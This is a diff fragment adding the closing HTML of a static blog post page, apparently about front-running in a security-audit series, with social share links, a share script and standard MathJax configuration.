+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F06%2F01%2F09.%25E5%25AE%2589%25E5%2585%25A8%25E5%25AE%25A1%25E8%25AE%25A1%2F33.%25E6%258A%25A2%25E5%2585%2588%25E4%25BA%25A4%25E6%2598%2593_2%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
